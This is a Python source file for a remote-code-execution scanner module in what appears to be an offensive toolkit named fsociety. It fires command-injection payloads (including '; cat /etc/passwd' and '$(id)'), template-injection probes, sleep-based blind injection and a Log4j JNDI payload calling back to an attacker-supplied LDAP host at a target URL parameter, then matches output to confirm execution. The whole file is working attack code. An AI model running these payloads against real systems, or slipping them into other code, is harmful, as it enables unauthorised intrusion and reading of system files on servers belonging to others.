from __future__ import annotations
import http.client
import json
import re
import ssl
import time
import urllib.parse

from fsociety.core.base import tool
from fsociety.core.logger import Log

CMD_MARKERS = {
    "unix": r"uid=\d+\([^)]+\)\s+gid=\d+",
    "passwd": r"root:x:0:0:",
    "windows": r"Microsoft Windows \[Version",
    "dir": r"Volume in drive",
    "whoami": r"nt authority|root|www-data|apache|nginx",
}

CMDI_PAYLOADS = [
    "; id", "| id", "`id`", "$(id)", "&& id", "|| id",
    "; whoami", "| whoami", "&& whoami",
    "; uname -a", "| uname -a",
    "; cat /etc/passwd", "| cat /etc/passwd",
    "; dir", "| dir", "&& dir",
    "; type C:\\Windows\\win.ini", "| type C:\\Windows\\win.ini",
]

SSTI_PAYLOADS = [
    ("{{7*7}}", "49"), ("${7*7}", "49"), ("#{7*7}", "49"),
    ("<%= 7*7 %>", "49"), ("{{7*'7'}}", "7777777"),
]

@tool("rce", "Multi-vector RCE engine: CMDi, SSTI, Blind, and CVEs", category="rce")
class Rce:
    @staticmethod
    def build_parser(p):
        p.add_argument("url", help="Target URL")
        p.add_argument("--param", required=True, help="Vulnerable parameter")
        p.add_argument("--method", default="GET", choices=["GET", "POST"])
        p.add_argument("--type", default="all", choices=["all", "cmdi", "ssti", "blind", "log4j"])
        p.add_argument("--delay", type=float, default=5.0, help="Delay for blind tests")
        p.add_argument("--lhost", help="Your IP for OOB/Blind tests (Log4j)")
        p.add_argument("--cookie", help="Cookie header value")
        p.add_argument("--insecure", action="store_true")
        p.add_argument("--timeout", type=float, default=10.0)

    @staticmethod
    def _ctx(insecure: bool):
        ctx = ssl.create_default_context()
        if insecure: ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
        return ctx

    @staticmethod
    def _send(url, method, param, payload, timeout, ctx, cookie):
        parsed = urllib.parse.urlparse(url)
        scheme = parsed.scheme or "http"
        host = parsed.hostname
        port = parsed.port or (443 if scheme == "https" else 80)
        path = parsed.path or "/"
        headers = {"User-Agent": "Mozilla/5.0"}
        if cookie: headers["Cookie"] = cookie

        start = time.time()
        try:
            if method == "GET":
                qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
                qs[param] = [payload]
                query = urllib.parse.urlencode(qs, doseq=True)
                conn = (http.client.HTTPSConnection(host, port, timeout=timeout, context=ctx) if scheme == "https" else http.client.HTTPConnection(host, port, timeout=timeout))
                conn.request("GET", f"{path}?{query}", headers=headers)
            else:
                body = urllib.parse.urlencode({param: payload})
                headers["Content-Type"] = "application/x-www-form-urlencoded"
                conn = (http.client.HTTPSConnection(host, port, timeout=timeout, context=ctx) if scheme == "https" else http.client.HTTPConnection(host, port, timeout=timeout))
                conn.request("POST", path, body=body, headers=headers)
            resp = conn.getresponse()
            text = resp.read(16384).decode("utf-8", "ignore")
            conn.close()
            return text, time.time() - start
        except Exception as exc:
            return str(exc), time.time() - start

    @staticmethod
    def _test_cmdi(args, ctx, log):
        for pl in CMDI_PAYLOADS:
            text, _ = Rce._send(args.url, args.method, args.param, pl, args.timeout, ctx, args.cookie)
            for name, pattern in CMD_MARKERS.items():
                if re.search(pattern, text):
                    log.hit(f"CMDi confirmed via '{pl.strip()}' -> Marker: {name}")
                    return True
        return False

    @staticmethod
    def _test_ssti(args, ctx, log):
        for pl, expected in SSTI_PAYLOADS:
            text, _ = Rce._send(args.url, args.method, args.param, pl, args.timeout, ctx, args.cookie)
            if expected in text:
                log.hit(f"SSTI confirmed via '{pl}' -> Evaluated to {expected}")
                return True
        return False

    @staticmethod
    def _test_blind(args, ctx, log):
        payloads = [f"; sleep {args.delay}", f"| sleep {args.delay}", f"$(sleep {args.delay})"]
        _, base_time = Rce._send(args.url, args.method, args.param, "1", args.timeout, ctx, args.cookie)
        for pl in payloads:
            _, elapsed = Rce._send(args.url, args.method, args.param, pl, args.timeout + args.delay, ctx, args.cookie)
            if elapsed >= args.delay * 0.8 and elapsed > base_time + 1:
                log.hit(f"Blind RCE confirmed via '{pl}' ({elapsed:.2f}s delay)")
                return True
        return False

    @staticmethod
    def _test_log4j(args, ctx, log):
        if not args.lhost: return False
        payload = f"${{jndi:ldap://{args.lhost}/a}}"
        Rce._send(args.url, args.method, args.param, payload, args.timeout, ctx, args.cookie)
        log.info("Log4j payload sent. Check your LDAP listener for callbacks.")
        return True

    @staticmethod
    def run(args, log: Log) -> int:
        ctx = Rce._ctx(args.insecure)
        found = False
        types = ["cmdi", "ssti", "blind"] if args.type == "all" else [args.type]

        for t in types:
            if t == "cmdi" and Rce._test_cmdi(args, ctx, log): found = True
            elif t == "ssti" and Rce._test_ssti(args, ctx, log): found = True
            elif t == "blind" and Rce._test_blind(args, ctx, log): found = True
            elif t == "log4j" and Rce._test_log4j(args, ctx, log): found = True

        if found: log.ok("RCE vectors executed.")
        else: log.warn("No RCE vulnerabilities detected.")
        return 0 if found else 1
